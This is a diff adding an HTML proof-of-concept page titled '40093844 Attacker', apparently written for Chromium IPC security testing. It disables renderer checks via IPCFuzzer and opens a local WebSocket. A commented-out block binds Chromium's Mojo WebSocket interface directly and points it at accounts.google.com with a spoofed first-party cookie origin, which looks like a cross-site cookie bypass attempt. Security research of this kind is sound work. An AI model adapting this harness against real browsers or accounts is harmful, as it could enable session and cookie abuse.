@@ -1,0 +1,85 @@
+<html>
+    <head>
+        <title>40093844 Attacker</title>
+        <script>
+            IPCFuzzer.deactivate_renderer_checks();
+            IPCFuzzer.activate_leak_sanitizer();
+        </script>
+    </head>
+    <body>
+        <script>
+            let socket = new WebSocket("ws://127.0.0.2:8080/ws");
+
+            socket.onopen = function (event) {
+                console.log("WebSocket is open now.");
+                socket.send("Hello, server!");
+            };
+
+            socket.onmessage = function (event) {
+                console.log("WebSocket message received:", event.data);
+            };
+
+            socket.onclose = function (event) {
+                console.log("WebSocket is closed now.");
+            };
+
+            socket.onerror = function (error) {
+                console.error("WebSocket error observed:", error);
+            };
+        </script>
+        <!--<script src="mojo_bindings.js"></script>
+        <script src="services/network/public/mojom/websocket.mojom.js"></script>
+        <script>
+            websocket_ptr = new network.mojom.WebSocketPtr();
+            Mojo.bindInterface(network.mojom.WebSocket.name, mojo.makeRequest(websocket_ptr).handle);
+
+            ws_url = new url.mojom.Url();
+            ws_url.url = "wss://accounts.google.com/"; //'ws://127.0.0.2:8080/';
+
+            requested_protocols = [];
+
+            first_party_for_cookies = new url.mojom.Url();
+            first_party_for_cookies.url = "http://127.0.0.1:8080";
+
+            additional_headers = [];
+
+            function websocket_client_impl() {
+                this.binding = new mojo.Binding(network.mojom.WebSocketClient, this);
+            }
+
+            websocket_client_impl.prototype = {
+                onFailChannel: async (r) => {
+                    console.log("onFailChannel: " + r);
+                },
+                onStartOpeningHandshake: async (r) => {
+                    console.log("onStartOpeningHandshake");
+                    console.log(r);
+                },
+                onFinishOpeningHandshake: async (r) => {
+                    console.log("onFinishOpeningHandshake: " + r);
+                },
+                onAddChannelResponse: async (r) => {
+                    console.log("onAddChannelResponse: " + r);
+                },
+                onDataFrame: async (r) => {
+                    console.log("onDataFrame: " + r);
+                },
+                onFlowControl: async (r) => {
+                    console.log("onFlowControl: " + r);
+                },
+                onDropChannel: async (r) => {
+                    console.log("onDropChannel: " + r);
+                },
+                onClosingHandshake: async (r) => {
+                    console.log("onClosingHandshake: " + r);
+                },
+            };
+
+            websocket_client = new websocket_client_impl();
+            websocket_client_ptr = new network.mojom.WebSocketClientPtr();
+            websocket_client.binding.bind(mojo.makeRequest(websocket_client_ptr));
+
+            websocket_ptr.addChannelRequest(ws_url, requested_protocols, first_party_for_cookies, additional_headers, websocket_client_ptr);
+        </script>-->
+    </body>
+</html>
